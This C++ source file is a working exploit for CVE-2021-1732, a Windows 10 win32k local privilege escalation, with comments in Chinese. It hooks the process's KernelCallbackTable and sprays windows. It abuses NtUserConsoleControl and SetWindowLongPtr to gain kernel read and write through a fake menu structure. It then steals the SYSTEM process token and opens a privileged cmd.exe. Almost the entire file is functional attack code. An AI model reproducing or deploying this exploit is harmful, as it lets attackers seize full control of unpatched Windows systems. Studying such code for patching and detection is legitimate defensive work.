#include<Windows.h>
#include <cstdio>
#include <iostream>
#include <intrin.h>
#include "command.h"

#define WNDCLASS_1 "mowen1"
#define WNDCLASS_2 "mowen2"
#define SPRAY_WND_PRE_MAX 50
#define SPRAY_WND_MAX 100
#define HookExtraBytesSIZE 0x1234u
#define OKernelDesktopHeapBaseOffset 0x8
#define OpExtraBytes 0x128
#define OcbWndExtra 0xc8
#define OdwStyle 0x018
#define OcbWndExtra 0x0C8
#define OdwExtraFlag 0x0E8
#define OEPROCESS_ActiveProcessLinks 0x2E8
#define OEPROCESS_UniqueProcessId 0x2E0
#define OEPROCESS_Token 0x358


typedef void(WINAPI* FRtlGetNtVersionNumbers)(DWORD*, DWORD*, DWORD*);
typedef NTSTATUS(WINAPI* FNtUserConsoleControl)(DWORD, ULONG_PTR, ULONG);
typedef NTSTATUS(WINAPI* FNtCallbackReturn)(PVOID Result, ULONG ResultLength, NTSTATUS Status);
typedef PVOID(WINAPI* RtlAllocateHeap)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
typedef NTSTATUS(WINAPI* FxxxClientAllocWindowClassExtraBytes)(unsigned int* pSize);
typedef NTSTATUS(WINAPI* FxxxClientFreeWindowClassExtraBytes)(PVOID pAddress);
typedef PVOID(WINAPI* FHMValidateHandle)(HANDLE h, BYTE byType);


FRtlGetNtVersionNumbers g_fRtlGetNtVersionNumbers = NULL;
FNtUserConsoleControl g_fNtUserConsoleControl = NULL;
FNtCallbackReturn g_fNtCallbackReturn = NULL;
RtlAllocateHeap g_fRtlAllocateHeap = NULL;
FxxxClientAllocWindowClassExtraBytes g_fxxxClientAllocWindowClassExtraBytes = NULL;
FxxxClientFreeWindowClassExtraBytes g_fxxxClientFreeWindowClassExtraBytes = NULL;
FHMValidateHandle g_fHMValidateHandle = NULL;

DWORD g_dwMyWndExtra = 0x1234;
HWND g_hWndPre[SPRAY_WND_PRE_MAX] = { 0 };
HWND g_hWnd[SPRAY_WND_MAX] = { 0 };
ULONG_PTR g_hWndK[SPRAY_WND_MAX] = { 0 };
NTSTATUS g_hWndCmod[SPRAY_WND_MAX] = { 0 };
ULONG_PTR g_wndKDesktopOffset0 = 0;
ULONG_PTR g_wndKDesktopOffset1 = 0;
ULONG_PTR g_wndK0ExtraBytesToWndKernelOffset1 = 0;
BOOL HookSuccessful = false;
struct _MENU_USER* g_fakeMenu = NULL;

int FindHMValidateHandle(HMODULE hUser32dll,FHMValidateHandle *pOutFHMValidateHandle) {
    PBYTE pMenuFunc = NULL;
    INT offset = 0;

    *pOutFHMValidateHandle = NULL;
    if (!hUser32dll){
        hUser32dll = GetModuleHandleA("user32.dll");
    }
    pMenuFunc = (PBYTE)GetProcAddress(hUser32dll, "IsMenu");
    if (pMenuFunc){
        for (size_t i = 0; i < 0x100; i++)
        {
            if (pMenuFunc[i] == 0xe8) {
                offset = (INT)*(PINT)(pMenuFunc+ i + 1);
                *pOutFHMValidateHandle = (FHMValidateHandle)(5 + pMenuFunc + offset + i);
                break;
            }
        }
    }
    return *pOutFHMValidateHandle != NULL ? 1 : 0;
}
NTSTATUS WINAPI MyxxxClientAllocWindowClassExtraBytes(unsigned int* pSize) {
    HWND attackHwnd = NULL;
    HWND pAttackHwndK = NULL;
    ULONG_PTR attackHwndKernel = NULL;
    ULONG_PTR tempbWndExtra = 0;
    ULONG_PTR hookResult[3] = { 0 };
    ULONG_PTR ChangeOffset = 0;
    ULONG_PTR ConsoleCtrlInfo[2] = { 0 };
    NTSTATUS ret1 = 0;

    if (*pSize == HookExtraBytesSIZE) {
        
        for (size_t i = 2; i < SPRAY_WND_MAX; i++)
        {
            tempbWndExtra = *(ULONG_PTR*)((PBYTE)g_hWndK[i] + OcbWndExtra);
            if (tempbWndExtra == (ULONG_PTR)HookExtraBytesSIZE) {
                attackHwnd = g_hWnd[i];
                attackHwndKernel = g_hWndK[i];
                pAttackHwndK = (HWND) * (ULONG_PTR*)(g_hWndK[i]);
                printf("找到[%d] attackHwnd -> %p attackHwndK -> %p pAttackHwndK -> %p\n",i,attackHwnd, attackHwndKernel, pAttackHwndK);
                break;
            }

        }
        if (!pAttackHwndK) {
            puts("MyxxxClientAllocWindowClassExtraBytes Hook 失败");
            goto ret;
        }
        HookSuccessful = true;
        puts("MyxxxClientAllocWindowClassExtraBytes Hook 成功");
        printf("hook.dwExtraFlagS -> %x\n", *(DWORD*)((PBYTE)attackHwndKernel + OdwExtraFlag));
            // 改变模式
        ChangeOffset = 0;
        ConsoleCtrlInfo[0] = (ULONG_PTR)pAttackHwndK; // 第一个参数需要为窗口句柄
        ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;
        ret1 = g_fNtUserConsoleControl(6, (ULONG_PTR)&ConsoleCtrlInfo, sizeof(ConsoleCtrlInfo));
        printf("hook.dwExtraFlagE -> %x\n", *(DWORD*)((PBYTE)attackHwndKernel + OdwExtraFlag));
        // 劫持偏移
        hookResult[0] = g_wndKDesktopOffset0;
        return g_fNtCallbackReturn((PVOID)&hookResult, 0x18, 0);
    }
ret:
    return g_fxxxClientAllocWindowClassExtraBytes(pSize);
}
NTSTATUS WINAPI MyxxxClientFreeWindowClassExtraBytes(PVOID pInfo)
{
    PVOID pAddress = *(PVOID*)((PBYTE)pInfo + 8);
    return g_fxxxClientFreeWindowClassExtraBytes(pInfo);
}

//Read kernel memory for 16 length
void ReadKernelMemoryQQWORD(ULONG_PTR pAddress, ULONG_PTR& pOut0, ULONG_PTR& pOut1)
{
    MENUBARINFO mbi = { 0 };
    mbi.cbSize = sizeof(MENUBARINFO);

    RECT Rect = { 0 };
    GetWindowRect(g_hWnd[0], &Rect);

    g_fakeMenu->rgItems->unknown_for_exploit = (PVOID)((PBYTE)pAddress - 0x40);
#if _DEBUG
    Sleep(3000);
#endif
    GetMenuBarInfo(g_hWnd[0], -3, 1, &mbi);

    BYTE pbKernelValue[16] = { 0 };
    DWORD off60 = *(DWORD*)((PBYTE)g_hWndK[0] + 0x60);
    *(DWORD*)(pbKernelValue) = mbi.rcBar.left - Rect.left;
    *(DWORD*)(pbKernelValue + 4) = mbi.rcBar.top - Rect.top;
    *(DWORD*)(pbKernelValue + 8) = mbi.rcBar.right - mbi.rcBar.left;
    *(DWORD*)(pbKernelValue + 0xc) = mbi.rcBar.bottom - mbi.rcBar.top;
#if _DEBUG
    printf("[debug] mbi %x%x %x%x \n",
        *(DWORD*)(pbKernelValue), *(DWORD*)(pbKernelValue + 4),
        *(DWORD*)(pbKernelValue + 8), *(DWORD*)(pbKernelValue + 0xc)
    );
#endif
    pOut0 = *(ULONG_PTR*)(pbKernelValue);
    pOut1 = *(ULONG_PTR*)(pbKernelValue + 8);
    printf("ReadKernelMemory pOut0: %llx , pOut1: %llx \n", pOut0, pOut1);
}

static VOID Cmd()
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    HMODULE ntdll, win32u,hUser32 = NULL;
    FILE* tempFile = NULL;
    DWORD dwMajorVer, dwMinorVer, dwBuildNumber,dwTemp = 0;
    PULONG_PTR pKernelCallbackTable = NULL;
    DWORD64 pPEB = NULL;
    DWORD oldProtect = 0;
    WNDCLASSEXA wndClassEx = {0};
    HWND hWnd,hWndB = NULL;
    ULONG_PTR hWndKernel,hWndKernelB = NULL;
    HMENU hMenuDbg, hMenu, hHelpMenu = NULL;
    ULONGLONG hWndKerneldwStyle0 = 0;
    LONG_PTR setValue, spMenu;
    MENUBARINFO mbi = { 0 };
    ULONG_PTR ChangeOffset = 0;
    ULONG_PTR ConsoleCtrlInfo[2] = { 0 }; // 参数长度为 0x10 字节
    NTSTATUS ret1 = 0;
    ULONG_PTR pExtraBytes,retExtraBytes, lpTemp0, lpTemp1 = 0;
    ULONG_PTR pSystemEProcess , pMyEProcess, pNextEProcess = 0;

    pSystemEProcess = pMyEProcess = pNextEProcess = 0;
    pExtraBytes = retExtraBytes = 0;
    setValue = spMenu = 0;
    hMenuDbg = hMenu = hHelpMenu = NULL;
    ntdll = win32u = hUser32 = NULL;
    hWnd = hWndB = NULL;
    hWndKernel = hWndKernelB = NULL;
    dwMajorVer = dwMinorVer = dwBuildNumber = dwTemp = 0;


    AllocConsole();
    freopen_s(&tempFile, "conin$", "r+t", stdin);
    freopen_s(&tempFile, "conout$", "w+t", stdout);

    puts("[*] CVE-2021-1732 Exploit by mowen");
    puts("[*] working in windows 10 1809(17763)");

    // 准备 Api
    ntdll = GetModuleHandleA("ntdll.dll");

    if (!ntdll) {
        puts("ntdll.dll 获取失败");
        goto error;
    }
    g_fRtlGetNtVersionNumbers = (FRtlGetNtVersionNumbers)GetProcAddress(ntdll, "RtlGetNtVersionNumbers");
    g_fRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);
    // 低 16 位为 Build ,高 16 位为
    dwBuildNumber = dwBuildNumber & 0xffff;
    printf("MajorVer:%d ; MinorVer:%d ; BuildNumber:%d\n", dwMajorVer, dwMinorVer, dwBuildNumber);
#if NDEBUG
    system("pause");
#endif 

    GetDesktopWindow();
    win32u = GetModuleHandleA("win32u.dll");
    if (!win32u) {
        puts("win32u.dll 获取失败");
        goto error;
    }
    hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) {
        puts("user32.dll 获取失败");
        goto error;
    }

    g_fNtUserConsoleControl = (FNtUserConsoleControl)GetProcAddress(win32u, "NtUserConsoleControl");
    g_fNtCallbackReturn = (FNtCallbackReturn)GetProcAddress(ntdll, "NtCallbackReturn");
    g_fRtlAllocateHeap = (RtlAllocateHeap)GetProcAddress(ntdll, "RtlAllocateHeap");

    puts("准备 Api...");
    // 获取 PEB->KernelCallbackTable
    pPEB = __readgsqword(0x60);
    pKernelCallbackTable = *(PULONG_PTR*)(pPEB + 0x58);
    printf("pPEB -> %p\n", pPEB);
    printf("pKernelCallbackTable -> %p\n", pKernelCallbackTable);

    g_fxxxClientAllocWindowClassExtraBytes = (FxxxClientAllocWindowClassExtraBytes)pKernelCallbackTable[123];
    g_fxxxClientFreeWindowClassExtraBytes = (FxxxClientFreeWindowClassExtraBytes)pKernelCallbackTable[124];
    printf("g_fxxxClientAllocWindowClassExtraBytes -> %p\ng_fxxxClientFreeWindowClassExtraBytes -> %p\n", g_fxxxClientAllocWindowClassExtraBytes, g_fxxxClientFreeWindowClassExtraBytes);
    // 获取 user32!HMValidateHandle  -> 传入窗口句柄，获取 tagWNDk 在用户空间的只读映射指针
    FindHMValidateHandle(hUser32, &g_fHMValidateHandle);
    printf("g_fHMValidateHandle -> %p\n", g_fHMValidateHandle);

    puts("修改 KernelCallbackTable...");
    // 修改 KernelCallbackTable
    VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
    pKernelCallbackTable[123] = (ULONG_PTR) MyxxxClientAllocWindowClassExtraBytes;
    pKernelCallbackTable[124] = (ULONG_PTR)MyxxxClientFreeWindowClassExtraBytes;
    VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, oldProtect, &oldProtect);

    printf("注册需要的窗口类 %s , %s\n", WNDCLASS_1, WNDCLASS_2);
    wndClassEx.cbSize = sizeof(wndClassEx);
    wndClassEx.hInstance = hInstance;
    wndClassEx.lpszClassName = WNDCLASS_1;
    wndClassEx.lpfnWndProc = DefWindowProc;
    wndClassEx.cbWndExtra = 0x20;
    RegisterClassExA(&wndClassEx);

    wndClassEx.lpszClassName = WNDCLASS_2;
    wndClassEx.cbWndExtra = g_dwMyWndExtra;
    wndClassEx.hInstance = hInstance;
    RegisterClassExA(&wndClassEx);


    hMenuDbg = CreateMenu();
    AppendMenuA(hMenuDbg, MF_STRING, 0xdead, "MoWenDbg");
    hWnd = CreateWindowExA(NULL, WNDCLASS_1, NULL, WS_VISIBLE, 0, 0, 1, 1, NULL, hMenuDbg, hInstance, NULL);

    for (size_t i = 0; i < SPRAY_WND_PRE_MAX; i++)
    {
        g_hWndPre[i] = CreateWindowExA(NULL, WNDCLASS_1, NULL, WS_VISIBLE, 0, 0, 1, 1, NULL, NULL, hInstance, NULL);
    }

    for (size_t i = 0; i < SPRAY_WND_MAX; i++)
    {
        ChangeOffset = 0;
        ConsoleCtrlInfo[0] = ConsoleCtrlInfo[1] = 0;

        if (i == 0) {
            if (!hMenu) {
                hMenu = CreateMenu();
                AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help"));
            }
            if (!hHelpMenu) {
                hHelpMenu = CreateMenu();
                AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about"));
            }
        }

        g_hWnd[i] = CreateWindowExA(NULL,WNDCLASS_1, NULL, WS_VISIBLE, 0, 0, 1, 1, NULL, hMenu, hInstance, NULL);
        // 获取内核映射桌面堆地址的泄漏
        g_hWndK[i] = (ULONG_PTR)g_fHMValidateHandle(g_hWnd[i], 1); 

        ConsoleCtrlInfo[0] = (ULONG_PTR)g_hWnd[i]; // 第一个参数需要为窗口句柄
        ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;
        g_hWndCmod[i] = g_fNtUserConsoleControl(6, (ULONG_PTR)&ConsoleCtrlInfo, sizeof(ConsoleCtrlInfo));
    }
    // 只保留 g_hWnd[0] \ g_hWnd[1]
    for (size_t i = 2; i < SPRAY_WND_MAX; i++) {
        if (g_hWnd[i] != NULL) {
            DestroyWindow((HWND)g_hWnd[i]);
            // 保留指针后续 hook 时要使用
        }
    }

    g_wndKDesktopOffset0 = *(ULONG_PTR*)((PBYTE)g_hWndK[0] + OKernelDesktopHeapBaseOffset);
    g_wndKDesktopOffset1 = *(ULONG_PTR*)((PBYTE)g_hWndK[1] + OKernelDesktopHeapBaseOffset);


#if _DEBUG
    for (size_t i = 0; i < 10; i++)
    {
        printf("[%04x] hWnd -> %p , hWndK -> %p \n",i, g_hWnd[i], g_hWndK[i]);
    }
#endif
    // hook 生成窗口B
    hWndB = CreateWindowExA(NULL, WNDCLASS_2, NULL, WS_VISIBLE, 0, 0, 1, 1, NULL, NULL, hInstance, NULL);
    if (!HookSuccessful) goto error;
    hWndKernelB = (ULONG_PTR)g_fHMValidateHandle(hWndB, 1);
    printf("hWndB -> %p\thWndKernelB -> %p\n", hWndB, hWndKernelB);
    printf("hWndK[0] -> %p\ng_wndKDesktopOffset0 -> %llx\n", g_hWndK[0], g_wndKDesktopOffset0);
    printf("hWndKernelB.dwExtraFlag -> %x\n", *(DWORD*)((PBYTE)hWndKernelB + OdwExtraFlag));

#if _DEBUG
    mbi.cbSize = sizeof(MENUBARINFO);
    Sleep(3000);
    GetMenuBarInfo(hWnd, OBJID_MENU, 1, &mbi);
#endif

    // 此时 hWndKernelB 为 内核偏移模式，并且偏移是到 hWndK[0] 处,可以直接对 hWndK[0] 空间进行任意写
    //SetWindowLong(hWndB, OcbWndExtra, 0xffffffff);

    hWndKerneldwStyle0 = *(ULONGLONG*)((PBYTE)g_hWndK[0] + OdwStyle);
    printf("OriginaldwStyle0 -> %llx\n", hWndKerneldwStyle0);    
    SetWindowLongPtrA(hWndB, OdwStyle, hWndKerneldwStyle0 | 0x4000000000000000u);
    printf("AttackdwStyle0 -> %llx\n", *(ULONGLONG*)((PBYTE)g_hWndK[0] + OdwStyle));

    g_fakeMenu = (struct _MENU_USER*)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, sizeof(struct _MENU_USER));
    g_fakeMenu->spMenuk = (struct _MENU_KERNEL*)g_fRtlAllocateHeap((PVOID)* (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, sizeof(struct _MENU_KERNEL));
    g_fakeMenu->spMenuk->pSelf = g_fakeMenu;
    g_fakeMenu->unk1_0x28 = (struct _MENU_UNK1_0x28*)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, sizeof(struct _MENU_UNK1_0x28));
    g_fakeMenu->unk1_0x28->cItems = 1;
    g_fakeMenu->unknown2_check = 1;
    g_fakeMenu->unknown3_check = 1;
    g_fakeMenu->rgItems = (struct _MENU_ITEMS*)g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, sizeof(struct _MENU_ITEMS));
    g_fakeMenu->rgItems->unknown_for_exploit = NULL;

    spMenu = SetWindowLongPtrA(g_hWnd[0], GWLP_ID, (LONG_PTR)g_fakeMenu);
    printf("hWnd[0].spMenu -> %p fakeMenu -> %p\n", spMenu,g_fakeMenu);

    SetWindowLongPtrA(hWndB, OdwStyle, hWndKerneldwStyle0);

    /*
        0xFFFFFD3040828C80
            0x18
                0x100
                    0x00
                    0xFFFFE50D38848080 Owing Process

    */

    ReadKernelMemoryQQWORD(spMenu + 0x18, lpTemp0, lpTemp1);
    ReadKernelMemoryQQWORD(lpTemp0+0x100, lpTemp0, lpTemp1);
    ReadKernelMemoryQQWORD(lpTemp0, lpTemp0, lpTemp1);
    pMyEProcess = lpTemp0;
    printf("Owing Process -> %p\n", pMyEProcess);

    pSystemEProcess = 0;
    pNextEProcess = pMyEProcess;

    for (int i = 0; i < 500; i++) {
        ReadKernelMemoryQQWORD(pNextEProcess + OEPROCESS_ActiveProcessLinks, lpTemp0, lpTemp1);
        pNextEProcess = lpTemp0 - OEPROCESS_ActiveProcessLinks;
        ReadKernelMemoryQQWORD(pNextEProcess + OEPROCESS_UniqueProcessId, lpTemp0, lpTemp1);

        if (lpTemp0 == 4) { // System process id
            pSystemEProcess = pNextEProcess;
            printf("System kernel eprocess:  %p\n", pSystemEProcess);

            ReadKernelMemoryQQWORD(pSystemEProcess + OEPROCESS_Token, lpTemp0, lpTemp1);
            ULONG_PTR pSystemToken = lpTemp0;
            
            dwTemp = *(DWORD*)((PBYTE)g_hWndK[0] + OdwExtraFlag);
            DWORD dwOld = SetWindowLong(hWndB, OdwExtraFlag, dwTemp & (~0x800));
            printf("Change hWndK ExtraFlag %x -> %x", dwOld, *(DWORD*)((PBYTE)g_hWndK[0] + OdwExtraFlag));

            //Write kernel memory
            LONG_PTR old = SetWindowLongPtr(hWndB, OpExtraBytes, pMyEProcess + OEPROCESS_Token);
            SetWindowLongPtr(g_hWnd[0], 0, (LONG_PTR)pSystemToken);  //Modify offset to memory address
            SetWindowLongPtr(hWndB, OpExtraBytes, (LONG_PTR)old);
            break;
        }
    }
    if (!pSystemEProcess) {
        puts("Exp利用失败");
    }
    else {
        puts("Exp利用成功");
        Cmd();
    }


    VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
    pKernelCallbackTable[123] = (ULONG_PTR)g_fxxxClientAllocWindowClassExtraBytes;
    pKernelCallbackTable[124] = (ULONG_PTR)g_fxxxClientFreeWindowClassExtraBytes;
    VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, oldProtect, &oldProtect);


#if _DEBUG
    mbi.cbSize = sizeof(MENUBARINFO);
    Sleep(3000);
    GetMenuBarInfo(hWnd, OBJID_MENU, 1, &mbi);
#endif

    puts("EXP 结束");
    if (0) {
error:
        puts("EXP 利用失败");
    }
#if _DEBUG
    goto endl;
#endif
    
    //if (hMenu) {
    //    DestroyMenu(hMenu);
    //    hMenu = NULL;
    //}
    //if (hHelpMenu) {
    //    DestroyMenu(hHelpMenu);
    //    hHelpMenu = NULL;
    //}
    //if (hWnd) {
    //    DestroyWindow(hWnd);
    //    hWnd = NULL;
    //}
    //if (hWndB) {
    //    DestroyWindow(hWndB);
    //    hWndB = NULL;
    //}
    for (size_t i = 0; i < SPRAY_WND_PRE_MAX; i++)
    {
        if (g_hWndPre[i]) {
            DestroyWindow(g_hWndPre[i]);
            g_hWndPre[i] = NULL;
        }
    }
    for (size_t i = 2; i < SPRAY_WND_MAX; i++)
    {
        if (g_hWnd[i]) {
            DestroyWindow(g_hWnd[i]);
            g_hWnd[i] = NULL;
        }
    }
endl:
    system("pause");
    return 0;
}

